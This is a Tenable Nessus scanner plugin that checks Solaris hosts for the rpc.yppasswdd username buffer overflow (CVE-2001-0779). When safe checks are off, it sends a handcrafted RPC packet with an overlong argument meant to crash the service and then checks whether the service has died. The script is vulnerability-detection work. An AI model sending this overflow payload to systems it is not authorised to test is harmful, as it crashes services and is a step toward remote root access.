#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10684);
 script_version ("$Revision: 1.28 $");
 script_cve_id("CVE-2001-0779");
 script_bugtraq_id(2763);
 script_xref(name:"OSVDB", value:"567");
 
 script_name(english:"Solaris rpc.yppasswdd username Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote RPC service has a remote root vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote RPC service 100009 (yppasswdd) is vulnerable
to a buffer overflow which allows any user to obtain a root
shell on this host." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2001-05/0273.html" );
 script_set_attribute(attribute:"solution", value:
"Disable this service if you don't use it, or contact Sun for a patch" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );

script_end_attributes();

 
 script_summary(english:"heap overflow through yppasswdd");
 script_category(ACT_MIXED_ATTACK); 
 script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");
 script_dependencies("rpc_portmap.nasl");
 script_require_keys("rpc/portmap");
 exit(0);
}

include("misc_func.inc");
include("global_settings.inc");

port = get_rpc_port(program:100009, protocol:IPPROTO_UDP);
if(port)
{
  if(!safe_checks())
  {
  if(get_port_state(port))
  {
   soc = open_sock_udp(port);
   if(soc)
   {
    #
    # We forge a bogus RPC request, with a way too long
    # argument. The remote process will die immediately,
    # and hopefully painlessly.
    #
    crp = crap(796);
    
    req = raw_string(0x56, 0x6C, 0x9F, 0x6B, 
    		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
		     0x00, 0x01, 0x86, 0xA9, 0x00, 0x00, 0x00, 0x01,
		     0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, 0x03, 0x20, 0x80, 0x1C, 0x40, 0x11
		     ) + crp + raw_string(0x00, 0x00, 0x00, 0x02,
		     0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03,
		     0x61, 0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x03,
		     0x61, 0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x02,
		     0x61, 0x61, 0x00, 0x00);
     send(socket:soc, data:req);
     r = recv(socket:soc, length:4096);
     if(r)
     {
      # if length(r) == 28, then the overflow did succeed. However,
      # I prefer to re-make a call to getrpcport(), that's safer
      # (who knows what exotic yppasswdd can reply ?)
      sleep(1);
      newport = get_rpc_port(program:100009, protocol:IPPROTO_UDP);
      set_kb_item(name:"rpc/yppasswd/sun_overflow", value:TRUE);
      if(!newport)
       security_hole(port:port, protocol:"udp");
     }
     close(soc);
   }
  }
 }
 else
 {
  if ( report_paranoia < 2 )exit(0);
  set_kb_item(name:"rpc/yppasswd/sun_overflow", value:TRUE);
  security_hole(port:port, protocol:"udp", extra:
"Nessus reports this vulnerability using only information that was 
gathered. Use caution when testing without safe checks enabled.");
 }
}
